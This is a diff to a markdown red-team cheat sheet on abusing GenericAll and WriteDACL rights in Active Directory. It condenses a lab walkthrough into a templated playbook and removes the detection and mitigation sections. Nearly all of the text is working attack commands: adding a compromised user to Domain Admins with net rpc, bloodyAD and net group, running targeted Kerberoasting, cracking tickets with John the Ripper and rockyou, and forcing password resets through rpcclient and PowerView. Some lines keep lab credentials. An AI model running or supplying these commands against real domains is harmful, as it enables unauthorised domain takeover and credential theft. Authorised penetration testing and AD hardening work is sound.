@@ -1,211 +1,77 @@
 <details>
 <summary> DACL/ACL-Based Escalation (GenericAll / WriteDACL / WriteProperty)</summary>
  <br> 
-In Active Directory (AD), a DACL (Discretionary Access Control List) is a component of an object’s security descriptor. It specifies which users or groups are allowed (or denied) access to the object and what actions they are permitted to perform. It essentially controls who can do what to an object. Such as a user account, computer, group, or any other directory object.
-If you (or a compromised account) have ACL rights like GenericAll, WriteDACL, or WriteProperty over another AD object (user, group, OU, computer), you can modify permissions or credentials to escalate privileges 
-Generic ALL Right
-In Active Directory, permissions and privileges define what actions an entity (user, group, or computer) can perform on another object. The “Generic ALL” privilege is one of the most powerful in AD because it grants complete control over the target object. This means that the user or group with this privilege can:
-
-Modify any attribute of the object
-Reset passwords
-Add or remove members from groups
-Delegate further control to other users
-Delete the object altogether
-Because of its extensive reach, an attacker who gains “Generic ALL” privileges on sensitive objects (like privileged groups or service accounts) can essentially gain domain dominance.
-
 Exploiting “Generic ALL” Privilege
-Here’s how an attacker can leverage the “Generic ALL” privilege to compromise Active Directory:
-
-Identifying Targets with “Generic ALL” Privilege
-The first step is to identify objects where the attacker has this privilege. This can be done using tools like BloodHound or PowerView, which map out Active Directory and show privilege relationships. Once identified, the attacker can choose their target based on the potential impact (e.g., a Domain Admin account).
-Resetting Passwords
-If the “Generic ALL” privilege is applied to a user account, the attacker can reset the account’s password. This is particularly devastating if the account is for a privileged user, such as a Domain Administrator. After resetting the password, the attacker can log in as that user and gain full control over the domain.
-Modifying Group Membership
-If the “Generic ALL” privilege is applied to a group, the attacker can add themselves to a high-privilege group, like Domain Admins or Enterprise Admins. This grants them the privileges of those groups, effectively giving them control over the entire domain.
-Abusing Delegated Control
-With the “Generic ALL” privilege, the attacker can delegate control of the target object to another user or group. This allows them to grant privileges to themselves or other malicious users without raising suspicion immediately.
-Deleting or Modifying Objects
-In extreme cases, an attacker with “Generic ALL” can delete critical objects, such as service accounts or privileged users, causing operational disruptions or creating avenues for further exploitation.
-🔍 Detection
-
-Use BloodHound to detect privileged edges (WriteDacl, GenericAll).
-
-Run PowerView:
-
-powershell
-
-    Get-ObjectAcl -SamAccountName TargetUser -ResolveGUIDs
-Filter for rights: GenericAll, WriteDacl, etc. 
-
-⚙️ Exploitation
-Use PowerView/Powermad:
-
-powershell
-
-    Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "LowPrivUser" -Rights All
-Then add yourself to Domain Admins or reset passwords.
-Exploitation Phase I – User Own Generic All Right for Group
-Compromised User: Komal
-
-Target Account: Domain Admin Group
-
-Now that the lab is set up, let’s walk through how an attacker (acting as Komal) can abuse the Generic ALL privilege.
-
-Assuming the Red Teamer knows the credential for Komal Users as a Standard Domain Users and would like to enumerate the other Domain users & Admin members with the help of “net-rpc” Samba command line Utility.
-
-net rpc user -U ignite.local/komal%'Password@1' -S 192.168.1.8
-net rpc group members "Domain Admins" -U ignite.local/komal%'Password@1' -S 192.168.1.8
-After executing above command its has been concluded that the Administrator users is only the single member of the Admin group. Unfortunately, the tester is doesn’t know the credentials of administrator.
-
-
-
+ 
+***User Own Generic All Right for Group***
+ Assuming the Red Teamer knows the credential for Users as a Standard Domain Users and would like to enumerate the other Domain users & Admin members with the help of “net-rpc” Samba command line Utility.
+ 
+    net rpc user -U <domain>/<user>%'<Password>' -S <DC ip>
+    net rpc group members "Domain Admins" -U <domain>/<user>%'<Password>' -S <DC ip>
 Bloodhound -Hunting for Weak Permission
 Use BloodHound to Confirm Privileges: You can use BloodHound to verify that Komal has the Generic ALL right on the Domain Admins group.
 
-bloodhound-python -u komal -p Password@1 -ns 192.168.1.8 -d ignite.local -c All
-Generic ALL Active Directory Abuse
+    bloodhound-python -u <user> -p <Password> -ns <dc ip> -d <domain-name> -c All
+Thus it has shown the User has Generic ALL privilege to Domain Admin group and provided steps for exploitation to be proceed. 
 
-From the graphical representation of Bloodhound, the tester would like to identify the outbound object control for selected user where the first degree of object control value is equal to 1.
-
-
-
-Thus it has shown the Komal User has Generic ALL privilege to Domain Admin group and provided steps for exploitation to be proceed.
-
-Generic ALL Active Directory Abuse
-
-Method for Exploitation – Account Manipulation (T1098)
+Method for Exploitation – Account Manipulation
 1. Linux Net RPC – Samba
 The tester can abuse this permission by Komal User into Domain Admin group and list the domain admin members to ensure that Komal Users becomes Domain Admin.
 
-net rpc group addmem "Domain Admins" "komal" -U ignite.local/komal%'Password@1' -S 192.168.1.8
-
-
+       net rpc group addmem "Domain Admins" "<user>" -U <domain-name>/<user>%'<Password>' -S <dc-ip>
+ 
 2. Linux Bloody AD
-bloodyAD --host "192.168.1.8" -d "ignite.local" -u "komal" -p "Password@1" add groupMember "Domain Admins" "komal"
-
-
-Thus, from the user property we can see Komal user has become a member of domain admin.
-
-Generic ALL Active Directory Abuse
-
+   
+       bloodyAD --host "<dc-ip>" -d "<domain-name>" -u "<user>" -p "<Password>" add groupMember "Domain Admins" "<user>"
+ Thus, from the user property we can see user has become a member of domain admin. 
 3. Windows Net command
-net group "domain admins" komal /add /domain
 
+    net group "domain admins" <user> /add /domain
 
-Exploitation Phase II – User’s own generic Right for another user
-To set up a lab environment where the user Nishant has Generic ALL rights over the user Vipin, you’ll need to follow several steps. This process involves configuring Active Directory (AD) permissions so that Nishant can manipulate attributes of the Vipin account.
-
-Step 1: Create Two AD user accounts
-net user vipin Password@1 /add /domain
-net user nishant Password@1 /add /domain
-                
-
-Step 2: Assign Generic ALL Permissions
-Open Active Directory Users and Computers.
-Navigate to the Vipin user account.
-Right-click on Vipin, select Properties.
-                Generic ALL Active Directory Abuse
-
-Go to the Security tab.
-Click Advanced and then Add.
-                
-
-In the “Enter the object name to select” box, type Nishant and click Check Names.
-After adding Nishant, set the permissions:
-Check Generic All in the permissions list (you may need to select Full Control to encompass all rights).
-                
-
-Ensure Applies to is set to This object only.
-                Generic ALL Active Directory Abuse
-
+***User’s own generic Right for another user*** 
 Bloodhound -Hunting for Weak Permissions
-Hunting for First Degree objection Control for Nishant Users as we did in previous steps
 
-bloodhound-python -u nishant -p Password@1 -ns 192.168.1.8 -d ignite.local -c All
-
-
-From the graph, it can be observed that the Nishant user owns generic all privileges on Vipin user
-
-Generic ALL Active Directory Abuse
-
-Moreover, Bloodhound also helps the pentest to define the possible attack from the user account nishant, this user can perform domain attack such as keroasting and shadow credentials
-
-
-
-Multiple Methods for Exploitation
-1. T1558.003 – Kerberoasting
-1.1  Linux Python Script – TargetedKerberoast
-Compromised User: Nishant: Password@123
-
-Target User: Vipin
-
-Kerberoasting is an attack technique that targets service accounts in Active Directory environments, where an attacker with Generic ALL permissions on a user can exploit the ability to request service tickets (TGS). By requesting TGS for service accounts, the attacker can obtain encrypted tickets that include the service account’s password hash. Since these tickets can be extracted and then offline cracked, the attacker can potentially gain access to the service account’s credentials. The attack leverages the fact that service accounts typically have elevated privileges, allowing the attacker to escalate their own access within the network once the password is cracked. This exploitation is particularly effective in environments where weak or easily guessable passwords are used for service accounts.
-
-Cloning the Targeted Kerberoast Tool
+    bloodhound-python -u <A-user> -p <Password> -ns <DC-Ip> -d <Domain-name> -c All
+ From the graph, it can be observed that the A user owns generic all privileges on B user.
+ 
+***Cloning the Targeted Kerberoast Tool***
 To perform this attack, first, clone the targetedKerberoast repository from GitHub using the following command:
 
-git clone https://github.com/ShutdownRepo/targetedKerberoast.git
-Generic ALL Active Directory Abuse
+    git clone https://github.com/ShutdownRepo/targetedKerberoast.git
 
-./targetedKerberoast.py --dc-ip '192.168.1.8' -v -d 'ignite.local' -u 'nishant' -p 'Password@1'
-As we have seen during the lab setup, the vipin user was added as a domain user account, which does not have any associated SPN. The Python script has modified the attribute of vipin user to set the SPN name and then dump Krbtgs hash that can be brute-forced offline. Moreover, the script performs a clear track step by removing the SPN well live from the user attribute.
-
-This type of attack is ideally best when the attacker is not willing to change the password for the target user <Vipin in our case>, even generic all privilege is enabled for the compromised user. Yes, this step is less noisy than changing the password of any user.
-
-
-
+    ./targetedKerberoast.py --dc-ip '<DC ip>' -v -d '<Domain name>' -u '<A user>' -p '<Password>'
+This type of attack is ideally best when the attacker is not willing to change the password for the target user <B user in our case>, even generic all privilege is enabled for the compromised user. Yes, this step is less noisy than changing the password of any user.
 Further, with the help of John the Ripper and a dictionary such as Rock You can help the attacker to brute force the weak password.
 
-Generic ALL Active Directory Abuse
+       john -w=/usr/share/wordlist/rockyou.txt hash
 
-1.2 Windows PowerShell Script-PowerView
-To perform Kerberoasting using PowerView on a Windows machine, you can leverage PowerView’s ability to enumerate Active Directory service accounts that have Service Principal Names (SPNs). These SPNs can be requested to obtain service tickets (TGS), which can then be cracked offline to reveal the service account’s credentials. Here’s a brief overview of the steps:
+***Change Password**
+Linux Net RPC – Samba
 
-Make sur that the target account has no SPN and then Set the SPN to obtain the KerbTGS hash
-Get-DomainUser 'vipin' | Select serviceprincipalname
-Set-DomainObject -Identity 'vipin' -Set @{serviceprincipalname='nonexistent/hackingarticles'}
-$User = Get-DomainUser 'vipin'
-$User | Get-DomainSPNTicket | f1
+    net rpc password vipin 'Password@987' -U ignite.local/nishant%'Password@1' -S 192.168.1.8
 
+Linux Net RPC – BloodAD
 
-Cracking TGS hash using Rockyou.txt with the help of Hashcat Tool.
+    bloodyAD --host "<DC-ip>" -d "<Domain-name>" -u "<a user>" -p "<Password>" set password "<B user>" "<Password>"
 
-Generic ALL Active Directory Abuse
+Linux Net RPC –Rpcclient
 
-2.     T1110.001 – Change Password
-2.1 Linux Net RPC – Samba
-net rpc password vipin 'Password@987' -U ignite.local/nishant%'Password@1' -S 192.168.1.8
+    rpcclient -U <Domain name>/<A user> <DC IP>
+    setuserinfo <B user> 23 <Password>
 
+Windows Net Utility
 
-2.2 Linux Net RPC – BloodAD
-bloodyAD --host "192.168.1.8" -d "ignite.local" -u "nishant" -p "Password@1" set password "vipin" "Password@9876"
-Generic ALL Active Directory Abuse
+    net user <B user> <Password> /domain
 
-2.3 Linux Net RPC –Rpcclient
-rpcclient -U ignite.local/nishant 192.168.1.8
-setuserinfo vipin 23 Ignite@987
-Generic ALL Active Directory Abuse
+Windows PowerShell -Powerview
 
-2.4 Windows Net Utility
-net user Vipin Password@1234 /domain
+    $SecPassword = ConvertTo-SecureString '<Password>' -AsPlainText -Force
+    $Cred = New-Object System.Management.Automation.PSCredential('<domain name B user>', $SecPassword)
 
+Windows PowerShell
 
-2.5 Windows PowerShell -Powerview
-$SecPassword = ConvertTo-SecureString 'Password@987' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('ignite.localvipin', $SecPassword)
-Generic ALL Active Directory Abuse
-
-2.6 Windows PowerShell
-$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-Set-DomainUserPassword -Identity 'vipin' -AccountPassword $NewPassword
-
-🛡️ Mitigation
-
-Audit ACLs on sensitive objects (adminCount=1).
-
-Use BloodHound to regularly review privileged rights.
-
-Limit ACEs granting WriteDACL or GenericAll.
+    $NewPassword = ConvertTo-SecureString '<Password>' -AsPlainText -Force
+    Set-DomainUserPassword -Identity '<b user>' -AccountPassword $NewPassword
 </details>
 <details>
 <summary>AdminSDHolder Abuse</summary>
